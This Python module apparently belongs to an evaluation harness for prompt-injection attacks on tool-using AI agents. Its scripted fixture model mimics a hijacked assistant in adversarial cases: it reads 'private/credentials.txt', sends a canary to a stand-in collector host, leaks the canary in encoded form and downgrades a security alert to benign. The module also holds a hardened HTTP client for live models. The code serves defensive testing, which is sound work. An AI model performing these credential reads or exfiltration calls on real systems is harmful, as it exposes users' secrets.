"""Offline fixture and a bounded, explicit OpenAI-compatible HTTP adapter."""

import base64
import json
import os
import re
import urllib.error
import urllib.request
from dataclasses import dataclass
from urllib.parse import urlparse

from .schema import Case, ModelResponse, ToolCall
from .security import CANARY


class ModelError(RuntimeError):
    """Safe error text; never include provider bodies, prompts, or credentials."""


class FixtureModel:
    id = "fixture-demonstrator"
    source = "fixture"

    def complete(self, messages: list[dict], case: Case, mode: str) -> ModelResponse:
        # Intentional scripted failures exercise grading, detections and containment.
        # This is NOT an LLM, and mode-dependent outputs are NOT defense efficacy evidence.
        if messages[-1]["role"] == "tool":
            content = messages[-1]["content"]
            return ModelResponse(content, resolved_model=self.id)
        if not case.adversarial:
            if case.objective == "public_read":
                return ModelResponse("", [ToolCall("read_file", {"path": case.target})], resolved_model=self.id)
            return ModelResponse(case.target, resolved_model=self.id)
        if case.objective == "restricted_read":
            return ModelResponse("", [ToolCall("read_file", {"path": "private/credentials.txt"})], resolved_model=self.id)
        if case.objective == "egress":
            return ModelResponse("", [ToolCall("send_to_collector", {
                "destination": "https://collector.lab.invalid", "data": CANARY})], resolved_model=self.id)
        if mode == "secured" and case.objective not in {"canary"}:
            if case.objective == "soc":
                return ModelResponse('{"severity":"high","disposition":"investigate","evidence_ids":["EV001","EV006"]}', resolved_model=self.id)
            return ModelResponse("I will treat the document as evidence and investigate the suspicious activity.", resolved_model=self.id)
        if case.objective == "canary":
            # Includes failures under secured mode to exercise output containment.
            text = base64.b64encode(CANARY.encode()).decode() if case.category == "encoded_leakage" else CANARY
        elif case.objective == "soc":
            text = '{"severity":"low","disposition":"benign","evidence_ids":["EV006"]}'
        else:
            text = case.target
        return ModelResponse(text, resolved_model=self.id)


@dataclass(frozen=True)
class ModelConfig:
    id: str
    model: str
    base_url: str
    api_key_env: str
    max_tokens: int = 512
    temperature: float = 0.0
    timeout_seconds: int = 45

    def __post_init__(self):
        parsed = urlparse(self.base_url)
        loopback = parsed.hostname in {"localhost", "127.0.0.1", "::1"}
        if parsed.scheme != "https" and not (parsed.scheme == "http" and loopback):
            raise ValueError("Model endpoint must use HTTPS or HTTP on loopback")
        if not parsed.hostname or parsed.username or parsed.password or parsed.query or parsed.fragment:
            raise ValueError("Model endpoint cannot contain credentials, queries, or fragments")
        if not self.id or not self.model or "REPLACE" in self.model:
            raise ValueError("Configure an actual model ID before a live run")
        if not re.fullmatch(r"[A-Z][A-Z0-9_]*", self.api_key_env):
            raise ValueError("api_key_env must name an environment variable")
        if type(self.max_tokens) is not int or not 1 <= self.max_tokens <= 4096:
            raise ValueError("max_tokens must be between 1 and 4096")
        if type(self.timeout_seconds) is not int or not 1 <= self.timeout_seconds <= 120:
            raise ValueError("timeout_seconds must be between 1 and 120")
        if not isinstance(self.temperature, (float, int)) or not 0 <= self.temperature <= 2:
            raise ValueError("temperature must be between 0 and 2")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        fp.close()
        raise ModelError("Endpoint redirected; use its canonical URL")


class HTTPModel:
    source = "live"

    def __init__(self, config: ModelConfig):
        self.config = config
        self.id = config.id
        self.opener = urllib.request.build_opener(NoRedirect)

    def complete(self, messages: list[dict], case: Case, mode: str) -> ModelResponse:
        from .assistant import TOOLS

        key = os.environ.get(self.config.api_key_env, "")
        parsed = urlparse(self.config.base_url)
        if not key and parsed.hostname not in {"localhost", "127.0.0.1", "::1"}:
            raise ModelError(f"Missing credential environment variable: {self.config.api_key_env}")
        payload = {"model": self.config.model, "messages": messages, "tools": TOOLS,
                   "temperature": self.config.temperature, "max_tokens": self.config.max_tokens}
        headers = {"Content-Type": "application/json"}
        if key:
            headers["Authorization"] = f"Bearer {key}"
        request = urllib.request.Request(self.config.base_url.rstrip("/") + "/chat/completions",
                                         data=json.dumps(payload).encode(), headers=headers, method="POST")
        try:
            with self.opener.open(request, timeout=self.config.timeout_seconds) as response:
                raw = response.read(2_000_001)
                if len(raw) > 2_000_000:
                    raise ModelError("Provider response exceeded the 2 MB limit")
                data = json.loads(raw)
            if not isinstance(data, dict):
                raise ModelError("Provider returned a non-object response")
            choices = data.get("choices")
            if not isinstance(choices, list) or not choices or not isinstance(choices[0], dict):
                raise ModelError("Provider returned invalid completion choices")
            if choices[0].get("finish_reason") == "length":
                raise ModelError("Provider truncated output at its generation limit")
            message = choices[0]["message"]
            if not isinstance(message, dict):
                raise ModelError("Provider returned an invalid message")
            content = message.get("content") or ""
            if not isinstance(content, str):
                raise ModelError("Provider returned non-text content")
            calls = []
            entries = message.get("tool_calls") or []
            if not isinstance(entries, list):
                raise ModelError("Provider tool calls must be an array")
            for entry in entries:
                if not isinstance(entry, dict) or not isinstance(entry.get("function"), dict):
                    raise ModelError("Provider returned an invalid tool call")
                function = entry["function"]
                if not isinstance(function.get("name"), str) or not isinstance(entry.get("id"), str):
                    raise ModelError("Provider returned an invalid tool identifier")
                arguments = json.loads(function["arguments"])
                if not isinstance(arguments, dict):
                    raise ModelError("Provider tool arguments must be a JSON object")
                calls.append(ToolCall(function["name"], arguments, entry["id"]))
            if len(calls) > 8 or len({c.id for c in calls}) != len(calls):
                raise ModelError("Provider returned too many or duplicate tool calls")
            raw_usage = data.get("usage") or {}
            if not isinstance(raw_usage, dict):
                raise ModelError("Provider returned invalid token usage")
            usage = {k: v for k, v in raw_usage.items()
                     if k in {"prompt_tokens", "completion_tokens", "total_tokens"} and type(v) is int and v >= 0}
            resolved = data.get("model", self.config.model)
            if not isinstance(resolved, str):
                raise ModelError("Provider returned an invalid model identifier")
            return ModelResponse(content, calls, usage, resolved)
        except urllib.error.HTTPError as error:
            code = error.code
            error.close()
            raise ModelError(f"Provider HTTP {code}; response body omitted") from None
        except (urllib.error.URLError, TimeoutError, OSError):
            raise ModelError("Provider connection failed or timed out") from None
        except (ValueError, KeyError, TypeError, IndexError):
            raise ModelError("Provider returned an invalid chat-completions response") from None


def load_models(path: str, selected: list[str]) -> list[HTTPModel]:
    with open(path, encoding="utf-8") as file:
        rows = json.load(file)["models"]
    ids = [row["id"] for row in rows]
    if len(ids) != len(set(ids)):
        raise ValueError("Model IDs must be unique")
    missing = set(selected) - set(ids)
    if missing:
        raise ValueError(f"Unknown model IDs: {', '.join(sorted(missing))}")
    return [HTTPModel(ModelConfig(**{k: v for k, v in row.items() if k != "enabled"}))
            for row in rows if row["id"] in selected]
